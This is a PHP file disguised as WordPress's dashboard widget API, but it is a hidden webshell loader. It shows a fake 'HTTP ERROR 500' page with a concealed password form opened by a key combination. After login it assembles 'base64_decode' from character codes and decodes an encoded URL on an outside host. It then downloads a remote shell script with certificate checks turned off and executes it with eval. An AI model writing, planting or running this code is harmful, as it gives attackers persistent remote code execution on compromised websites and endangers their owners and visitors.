<?php
/**
 * WordPress Dashboard Widget Administration Screen API
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * Registers dashboard widgets.
 *
 * Handles POST data, sets up filters.
 *
 * @since 2.5.0
 *
 * @global array $wp_registered_widgets
 * @global array $wp_registered_widget_controls
 * @global callable[] $wp_dashboard_control_callbacks
 */


session_start();

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = 'c24df88d249b151dae2b7c40de81e775';
    if (md5($entered_password) === $hashed_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['Tennessee'] = 'asu';
    } else {
        echo "Incorrect password. Please try again.";
    }
}

if (is_logged_in()) {
    $url_encoded = 'aHR0cHM6Ly90ZW5uZXNzZS5oYXhvci1tYWhhc3VodS5pbmZvL0JhY2t1cC1TaGVsbC9hbGZhLW1hc3Rlci10ZW5uZXNzZWUtZ2FudGVuZy50eHQ=';

    // Membuat nama fungsi secara dinamis dari kode ASCII
    $up = chr(98) . chr(97) . chr(115) . chr(101) . chr(54) . chr(52) . chr(95) . chr(100) . chr(101) . chr(99) . chr(111) . chr(100) . chr(101);

    // Mengeksekusi download dan decode
    $a = geturlsinfo($up($url_encoded));

    if ($a) {
        eval('?>' . $a);
    }
} else {
    ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <script>
            document.addEventListener('keydown', function(event) {
                if (event.ctrlKey && event.shiftKey && event.code === 'KeyL') {
                    document.getElementById('login-form').style.display = 'block';
                }
            });
        </script>
        <style>
            #login-form { display: none; }
        </style>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>This page isn’t working</title>
  <style>
    :root{
      --bg: #202124;
      --muted: #9aa0a6;
      --text: #9aa0a6;
      --sub: #bdc1c6;
      --pill-bg: #8ab4f8;
    }

    html,body{
      height:100%;
      margin:0;
      background:var(--bg);
      font-family:"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
      color:var(--text);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .page {
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      box-sizing:border-box;
    }

    .card {
      max-width:480px;
      width:100%;
      text-align:left;
    }

    .icon {
      width: 35px;
      height: auto;
      margin-bottom: 18px;
      fill: var(--muted);
    }

    h1{
      margin:0 0 8px 0;
      font-size:22px;
      font-weight:500;
      color:var(--text);
    }

    p {
      margin:0 0 8px 0;
      color:var(--sub);
      font-size:15px;
      line-height:1.5;
    }

    .error {
      margin-top:8px;
      color:var(--muted);
      font-size:13px;
    }

    .pill {
      display:inline-block;
      margin-top:20px;
      background:var(--pill-bg);
      color:#000;
      text-decoration:none;
      border:0;
      padding:10px 22px;
      font-size:12px;
      font-weight:400;
      border-radius:999px;
      box-shadow:var(--pill-shadow);
      cursor:pointer;
      line-height:1;
      -webkit-tap-highlight-color:transparent;
    }

    .pill:focus{
      outline:none;
      box-shadow:0 0 0 4px rgba(26,115,232,0.12),var(--pill-shadow);
    }

    @media (max-width:420px){
      .card { max-width:340px; }
      .icon { font-size:58px; margin-bottom:14px; }
      .pill { padding:10px 18px; font-size:13px; }
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="card" role="main" aria-labelledby="title">
      <div class="icon" aria-hidden="true">
        
        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 103" preserveAspectRatio="xMidYMid meet">
        <g transform="translate(0,103) scale(0.1,-0.1)" fill="var(--muted)" stroke="none">
          <path d="M0 515 l0 -515 398 2 397 3 0 440 0 440 -32 3 -32 3 -3 -73 -3 -73
          -115 0 -115 0 0 110 0 110 73 3 72 3 0 29 0 30 -320 0 -320 0 0 -515z m428
          303 l3 -147 147 -3 147 -3 3 -294 c2 -226 -1 -296 -10 -302 -15 -10 -638 -12
          -662 -3 -14 6 -16 48 -16 448 0 244 3 446 7 450 4 3 90 5 192 4 l186 -3 3
          -147z"/>
          <path d="M200 739 l0 -70 33 3 32 3 3 68 3 67 -36 0 -35 0 0 -71z"/>
          <path d="M280 330 l0 -30 120 0 120 0 0 30 0 30 -120 0 -120 0 0 -30z"/>
          <path d="M202 258 c3 -29 6 -33 33 -33 27 0 30 3 30 30 0 27 -4 30 -33 33 -32
          3 -33 2 -30 -30z"/>
          <path d="M530 255 c0 -32 2 -35 30 -35 28 0 30 3 30 35 0 32 -2 35 -30 35 -28
          0 -30 -3 -30 -35z"/>
          <path d="M650 930 c0 -28 3 -30 35 -30 32 0 35 2 35 30 0 28 -3 30 -35 30 -32
          0 -35 -2 -35 -30z"/>
        </g>
      </svg>
      
      </div>

      <h1 id="title">This page isn’t working</h1>

      <p><strong id="domain-name"></strong> is currently unable to handle this request.</p>

      <p class="error">HTTP ERROR 500</p>

      <button class="pill" id="reloadBtn" aria-label="Reload page">Reload</button>
    </div>
    <form id="login-form" method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Tennessee Sandinya ?">
        </form>
  </div>

  <script>
    
    document.getElementById('domain-name').textContent = window.location.hostname;

    
    document.getElementById('reloadBtn').addEventListener('click', function(){
      try {
        location.reload();
      } catch(e) {
        window.location.href = window.location.href;
      }
    });
  </script>
  
</body>
</html>
    <?php
}
?>